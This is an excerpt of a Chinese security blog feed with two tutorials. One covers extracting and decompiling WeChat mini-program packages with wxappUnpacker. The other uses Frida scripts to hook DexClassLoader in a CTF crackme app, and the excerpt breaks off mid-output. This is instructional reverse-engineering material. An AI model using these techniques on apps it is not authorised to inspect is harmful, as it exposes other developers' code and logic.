    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">网易MUMU模拟器</span><br><span class="line">APP文件管理器</span><br><span class="line">微信开发者工具:Stable Build (1.05.2108130)</span><br></pre></td></tr></table></figure><h1 id="获取小程序包"><a href="#获取小程序包" class="headerlink" title="获取小程序包"></a>获取小程序包</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.使用自己手机上的微信打开对应的小程序,可以添加到&quot;我的小程序&quot;</span><br><span class="line">2.打开模拟器的微信并登录</span><br><span class="line">3.在模拟器微信的下拉小程序最近使用历史中打开&quot;你所选的小程序&quot;,如果历史记录中没有就在我的小程序中找一找</span><br><span class="line">4.打开小程序等待加载之后就可以去找源码包了</span><br><span class="line">5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)</span><br><span class="line">6.拷贝到mumu浏览器共享目录</span><br></pre></td></tr></table></figure><p>小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/</p><p>…部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913181136982.png" alt="image-20210913181136982"></p><a id="more"></a><h1 id="反编译小程序"><a href="#反编译小程序" class="headerlink" title="反编译小程序"></a>反编译小程序</h1><p>地址：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p><p>下载后在目录下安装如下依赖：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">    </span><br><span class="line">npm install css-tree</span><br><span class="line">    </span><br><span class="line">npm install cssbeautify</span><br><span class="line">    </span><br><span class="line">npm install vm2</span><br><span class="line">    </span><br><span class="line">npm install uglify-es</span><br><span class="line">    </span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure><p>使用命令<code>node wuWxapkg.js path_wxapkg</code>进行反编译输出信息如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ node wuWxapkg.js _1900266061_26.wxapkg</span><br><span class="line">Unpack file _1900266061_26.wxapkg...</span><br><span class="line"></span><br><span class="line">Header info:</span><br><span class="line">  firstMark: 0xbe</span><br><span class="line">  unknownInfo:  0</span><br><span class="line">  infoListLength:  1305</span><br><span class="line">  dataLength:  291959</span><br><span class="line">  lastMark: 0xed</span><br><span class="line"></span><br><span class="line">File list info:</span><br><span class="line">  fileCount:  38</span><br><span class="line">Saving files...</span><br><span class="line">Unpack done.</span><br><span class="line">Split app-service.js and make up configs &amp; wxss &amp; wxml &amp; wxs...</span><br><span class="line">deal config ok</span><br><span class="line">deal js ok</span><br><span class="line">deal html ok</span><br><span class="line">deal css ok</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;circle&#x2F;circle.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wave&#x2F;wave.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;date&#x2F;date.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;exam&#x2F;exam.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;freeclass&#x2F;freeclass.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;grade&#x2F;grade.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;index.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;passwd&#x2F;passwd.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;each.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;jxpg.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;level&#x2F;level.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;timetable.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">splitJs: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;httputils.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;util.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 app.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;circle&#x2F;circle.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wave&#x2F;wave.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;passwd&#x2F;passwd.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;index.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;grade&#x2F;grade.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;level&#x2F;level.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;timetable.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;freeclass&#x2F;freeclass.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;date&#x2F;date.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;exam&#x2F;exam.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;jxpg.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;each.js</span><br><span class="line">Splitting &quot;&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js&quot; done.</span><br><span class="line">Guess wxss(first turn)...</span><br><span class="line">Import count info: &#123;&#125;</span><br><span class="line">Guess wxss(first turn) done.</span><br><span class="line">Generate wxss(second turn)...</span><br><span class="line">Generate wxss(second turn) done.</span><br><span class="line">Save wxss...</span><br><span class="line">saveDir: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26</span><br><span class="line">Split and make up done.</span><br><span class="line">Delete files...</span><br><span class="line">Deleted.</span><br><span class="line"></span><br><span class="line">File done.</span><br><span class="line">Total use: 643.682ms</span><br></pre></td></tr></table></figure><h1 id="工具用法"><a href="#工具用法" class="headerlink" title="工具用法"></a>工具用法</h1><ul><li><code>node wuConfig.js &lt;files...&gt;</code> 将 app-config.json 中的内容拆分到各个文件对应的 .json 和 app.json , 并通过搜索 app-config.json 所在文件夹下的所有文件尝试将 iconData 还原为 iconPath 。</li><li><code>node wuJs.js &lt;files...&gt;</code> 将 app-service.js (或小游戏中的 game.js ) 拆分成一系列原先独立的 javascript 文件，并使用 Uglify-ES 美化，从而尽可能还原编译前的情况。</li><li><code>node wuWxml.js [-m] &lt;files...&gt;</code> 将编译/混合到 page-frame.html ( 或 app-wxss.js ) 中的 wxml 和 wxs 文件还原为独立的、未编译的文件。如果加上<code>-m</code>指令，就会阻止<code>block</code>块自动省略，可能帮助解决一些相关过程的 bug 。</li><li><code>node wuWxss.js &lt;dirs...&gt;</code> 通过获取文件夹下的 page-frame.html ( 或 app-wxss.js ) 和其他 html 文件的内容，还原出编译前 wxss 文件的内容。</li><li><code>node wuWxapkg.js [-o] [-d] [-s=&lt;Main Dir&gt;] &lt;files...&gt;</code> 将 wxapkg 文件解包，并将包中上述命令中所提的被编译/混合的文件自动地恢复原状。如果加上<code>-o</code>指令，表示仅解包，不做后续操作。如果加上<code>-d</code>指令，就会保留编译/混合后所生成的新文件，否则会自动删去这些文件。同时，前面命令中的指令也可直接加在这一命令上。</li></ul><p>ps：<strong>如果想单独执行config、js、wxml、wxss的反编译可以在解包时加-o参数不做后续操作</strong></p><h1 id="导入开发者工具或者打开编辑器进行查看"><a href="#导入开发者工具或者打开编辑器进行查看" class="headerlink" title="导入开发者工具或者打开编辑器进行查看"></a>导入开发者工具或者打开编辑器进行查看</h1><p>打开微信开发者工具,导入项目即可，对应id申请测试就可以</p><ul><li>注意勾选不校验合法域名</li><li>勾掉e6转es5(这个小程序貌似并没有使用es6语法)</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184148585.png" alt="image-20210913184148585"></p><p>解包其它小程序可能项目配置略有不同。</p><h1 id="图形化操作"><a href="#图形化操作" class="headerlink" title="图形化操作"></a>图形化操作</h1><p>下载<a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p><p>根据自己的版本进行下载安装</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184505518.png" alt="image-20210913184505518"></p><p>打开后直接上传对应的wxapkg文件即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184547303.png" alt="image-20210913184547303"></p><p>可以查看安全日志，并导出压缩包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184618552.png" alt="image-20210913184618552"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p><p><a href="https://github.com/wetools/wept">https://github.com/wetools/wept</a></p><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p><p><a href="http://xuedingmiao.com/blog/xcx_unpack.html">http://xuedingmiao.com/blog/xcx_unpack.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Mac os 11.2.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;网易MUMU模拟器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;APP文件管理器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;微信开发者工具:Stable Build (1.05.2108130)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&quot;获取小程序包&quot;&gt;&lt;a href=&quot;#获取小程序包&quot; class=&quot;headerlink&quot; title=&quot;获取小程序包&quot;&gt;&lt;/a&gt;获取小程序包&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1.使用自己手机上的微信打开对应的小程序,可以添加到&amp;quot;我的小程序&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.打开模拟器的微信并登录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.在模拟器微信的下拉小程序最近使用历史中打开&amp;quot;你所选的小程序&amp;quot;,如果历史记录中没有就在我的小程序中找一找&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.打开小程序等待加载之后就可以去找源码包了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6.拷贝到mumu浏览器共享目录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/&lt;/p&gt;
&lt;p&gt;…部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913181136982.png&quot; alt=&quot;image-20210913181136982&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="小程序" scheme="http://www.ol4three.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(下)</title>
    <link href="http://www.ol4three.com/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/"/>
    <id>http://www.ol4three.com/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/</id>
    <published>2021-08-13T06:21:07.000Z</published>
    <updated>2021-12-21T10:31:06.479Z</updated>
    
    <content type="html"><![CDATA[<p>​    上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。</p><p>​    这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。最终在虚拟机、测试机和frida中发现多种问题，之后更换测试机进行测试的时候仍然存在问题，留下了一部分搞不懂的地方，当个坑未，来找到解决问题在进行填补。</p><h1 id="文章涉及内容以及使用到的工具"><a href="#文章涉及内容以及使用到的工具" class="headerlink" title="文章涉及内容以及使用到的工具"></a><strong>文章涉及内容以及使用到的工具</strong></h1><h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADT（Android Developer Tools）</span><br><span class="line">Jadx-gui</span><br><span class="line">JEB</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">android源码包</span><br><span class="line">Nexus 6p（genymotion，实体机等亦可）</span><br></pre></td></tr></table></figure><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java 泛型</span><br><span class="line">Java 反射机制</span><br><span class="line">DexClassLoader 动态加载机制</span><br><span class="line">Frida 基本操作</span><br><span class="line">Frida 创建任意类型数组（Java.array）</span><br><span class="line">Frida 类型转换（Java.cast）</span><br><span class="line">Frida 方法重载（overload）</span><br><span class="line">Frida Spawn</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="代码分析与构造"><a href="#代码分析与构造" class="headerlink" title="代码分析与构造"></a>代码分析与构造</h1><h2 id="Frida-Spawn的使用"><a href="#Frida-Spawn的使用" class="headerlink" title="Frida Spawn的使用"></a>Frida Spawn的使用</h2><p>​    通过上篇Robust的原理学习和对app的分析，我们知道Robust的其实就是在正常的使用<code>DexClassLoader</code>去动态加载文件，随后通过<code>反射</code>的方式去调用类方法或成员变量。</p><p>​    同时在上篇文章中，我们也知道Robust调用DexClassLoader的类是在<code>PatchExecutor</code>中，而调用PatchExecutor类是在一个叫<code>runRobust</code>的方法中，这个方法就在<code>MainActivity</code>中，并且在<code>onCreate</code>方法中调用。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813160714545.png" alt="image-20210813160714545"></p><p>现在我们明白了一点是，app动态加载dex的地方是在onCreate中，也就是说app一启动就执行了动态加载，并不是在我们点击按钮的时候。所以这个地方，我们要执行py脚本的话，需要在app执行onCreate方法之前。frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。</p><p>我们可以通过<code>-f</code>参数选项来实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -U -f cn.chaitin.geektan.crackme   &#x2F;&#x2F;app完整名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida -U -f cn.chaitin.geektan.crackme                                                       1 ↵</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 15.1.1 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Spawned &#96;cn.chaitin.geektan.crackme&#96;. Use %resume to let the main thread start executing!</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt; %resume</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211108183528543.png" alt="image-20211108183528543"></p><p>运行一遍我们就可以从从上面可以看到，通过<code>-f</code>参数，frida会Spawned这个应用，在这个时候启动python脚本，再执行<code>%resume</code>命令,我们就可以在app执行onCreate方法前完成脚本的启动，这时候就能hook住onCreate中执行的一些方法。</p><h2 id="DexClassLoader-动态加载机制"><a href="#DexClassLoader-动态加载机制" class="headerlink" title="DexClassLoader 动态加载机制"></a>DexClassLoader 动态加载机制</h2><p>现在我们已经知道hook住onCreate中执行的方法了，现在我们就来试试，第一个目标是能获取到动态加载的dex中的类。在这直接我们来试一下直接去hook动态加载的类，会出现什么情况。</p><p>JS代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>我们首先启动通过frida启动，然后运行我们的脚本，在oncreate方法未调用前，运行我们的脚本，在使用%resume启动APP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.frida -U -f cn.chaitin.geektan.crackme</span><br><span class="line">2.python jscode.py</span><br><span class="line">3.%resume</span><br></pre></td></tr></table></figure><p>这里可以明显的看到输出了对应的错误信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]&#39;, &#39;stack&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js:124)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:443)\n    at value (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:812)\n    at _make (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:112)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:63)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:246)\n    at &lt;anonymous&gt; (&#x2F;script1.js:4)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:16)\n    at _performPendingVmOps (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:238)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:230)\n    at apply (native)\n    at ne (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:613)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:592)&#39;, &#39;fileName&#39;: &#39;frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js&#39;, &#39;lineNumber&#39;: 124, &#39;columnNumber&#39;: 1&#125;</span><br></pre></td></tr></table></figure><p>果不其然，这样去直接hook类肯定是不行的，但我们知道只要是从外部资源文件中动态加载dex，一般都是采用DexClassLoader动态加载的。学习过Java的同学应该知道，DexClassLoader动态加载的主要方法就是<code>loadClass()</code>。我们从Java源码上去分析一下，这里给大家一个java开发文档的查看地址：<a href="https://www.androidos.net.cn/android/8.0.0_r4/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java">访问</a></p><p>我们看到DexClassLoader的构造函数有4个参数，这里没有loadClass()，我们继续查看它的父类BaseDexClassLoader。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class DexClassLoader extends BaseDexClassLoader &#123;</span><br><span class="line">    public DexClassLoader(String dexPath, String optimizedDirectory,</span><br><span class="line">            String librarySearchPath, ClassLoader parent) &#123;</span><br><span class="line">        super(dexPath, new File(optimizedDirectory), librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样BaseDexClassLoader也没有loadClass()，最终在它的父类<code>ClassLoader</code>中找到了loadClass()方法。</p><p>可以看到DexClassLoader加载的逻辑其实就是ClassLoader中的loadClass()，它的机制简单的了解到这里，现在我们来试试，通过这样的方式能不能hook我们想要的类。</p><p>我们先hook DexClassLoader的构造函数，看看传递进的参数值是什么。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        &#x2F;&#x2F;创建一个DexClassLoader的wapper</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        &#x2F;&#x2F;hook 它的构造函数$init，我们将它的四个参数打印出来看看。</span><br><span class="line">        dexclassLoader.$init.implementation &#x3D; function(dexPath,optimizedDirectory,librarySearchPath,parent)&#123;</span><br><span class="line">             console.log(&quot;dexPath:&quot;+dexPath);</span><br><span class="line">            console.log(&quot;optimizedDirectory:&quot;+optimizedDirectory);</span><br><span class="line">             console.log(&quot;librarySearchPath:&quot;+librarySearchPath);</span><br><span class="line">            console.log(&quot;parent:&quot;+parent);</span><br><span class="line">            &#x2F;&#x2F;不破换它原本的逻辑，我们调用它原本的构造函数。</span><br><span class="line">          this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;down!&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行情况如下：</p><p>我们获取到了构造函数的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">down!</span><br><span class="line">dexPath:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache&#x2F;GeekTan&#x2F;patch_temp.jar</span><br><span class="line">optimizedDirectory:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache</span><br><span class="line">librarySearchPath:null</span><br><span class="line">parent:dalvik.system.PathClassLoader[DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;arm64, &#x2F;vendor&#x2F;lib64, &#x2F;system&#x2F;lib64]]]</span><br></pre></td></tr></table></figure><h2 id="Frida-方法重载（overload）"><a href="#Frida-方法重载（overload）" class="headerlink" title="Frida 方法重载（overload）"></a>Frida 方法重载（overload）</h2><p>我们来尝试获取一下动态加载的类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined；</span><br><span class="line">        &#x2F;&#x2F;hook loadClass方法</span><br><span class="line">        dexclassLoader.loadClass.implementation &#x3D; function(name)&#123;</span><br><span class="line">        &#x2F;*因为loadClass可能会加载很多类，所以我们得定义个hookname变量，</span><br><span class="line">        这样有针对的获取我们想要的类*&#x2F;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行看看结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &quot;Error: loadClass(): has more than one 